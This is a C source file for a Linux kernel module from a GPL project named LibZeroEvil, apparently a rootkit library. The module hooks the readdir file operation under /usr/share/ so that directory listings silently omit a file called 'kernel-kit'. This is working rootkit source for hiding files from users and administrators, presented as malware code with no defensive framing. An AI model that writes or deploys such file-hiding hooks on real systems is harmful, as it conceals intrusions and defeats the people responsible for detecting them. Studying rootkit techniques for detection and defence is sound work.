// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/fs.h> // filp_open, filp_close.
# endif // CPP

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define ROOT_PATH "/usr/share/"
# define SECRET_FILE "kernel-kit"

int
(*real_readdir)(struct file *filp, void *dirent, filldir_t filldir);
int
(*real_filldir)(void *dirent,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);

int
fake_readdir(struct file *filp, void *dirent, filldir_t filldir);
int
fake_filldir(void *dirent, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    set_file_op(readdir, ROOT_PATH, fake_readdir, real_readdir);

    if (!real_readdir) {
        return -ENOENT;
    }

    return 0;
}


void
cleanup_module(void)
{
    if (real_readdir) {
        void *dummy;
        set_file_op(readdir, ROOT_PATH, real_readdir, dummy);
    }

    fm_alert("%s\n", "Farewell the World!");
    return;
}


int
fake_readdir(struct file *filp, void *dirent, filldir_t filldir)
{
    real_filldir = filldir;

    return real_readdir(filp, dirent, fake_filldir);
}


int
fake_filldir(void *dirent, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
{
    if (strcmp(name, SECRET_FILE) == 0) {
        fm_alert("Hiding: %s", name);
        return 0;
    }

    /* pr_cont("%s ", name); */

    return real_filldir(dirent, name, namlen, offset, ino, d_type);
}
